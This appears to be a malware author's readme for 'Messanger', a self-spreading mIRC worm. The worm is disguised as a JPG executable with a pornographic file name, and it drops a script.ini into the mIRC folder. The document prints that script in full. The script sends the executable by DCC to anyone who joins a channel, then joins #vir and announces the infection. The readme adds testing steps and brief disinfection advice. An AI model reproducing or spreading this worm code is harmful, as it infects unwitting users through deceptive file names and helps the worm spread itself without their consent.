Yes, this is what happens when I can't sleep
but dont want to do any REAL coding.

Info: 
Messanger is sent as a file called "Lisa_tits~1JPG.exe" when this
file is run the program displays a bit of Pr0n and drops a script.ini 
file into the c:\mirc directory. The lastest version of mIRC (5.51) will use
this script.ini on the next starting of the program. The script itself assumes that:
1)Lisa_tits~1JPG.exe is in the default download mirc directory (c:\mirc\download)
2)That mirc is installed in its default path. May not work with some earlier versions
of mirc (some earlier versions of mirc will auto rename script.ini to script.old, but this
seems not to be the case anymore).

The script added is:
[script]
n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\Lisa_Tits~1JPG.exe }
n1=on 1:CONNECT: {
n2=  /join #vir
n3=  /msg #vir Greets to Opic & the CodeBreakers! Meet another 'Messanger' infected user!

To test:
1)Have or install mIRC v5.51
2)Place Lisa_tits~1JPG.exe (Messanger) in c:\mirc\download directory and execute it.
3)This will install the script.ini file in c:\mirc
4)Run mIRC and watch those pr0n lovers gobble jump for joy!

Disinfection: 
simply delete script.ini (ie: its safe as all hell to test, and fun at least to check
out the pr0n).
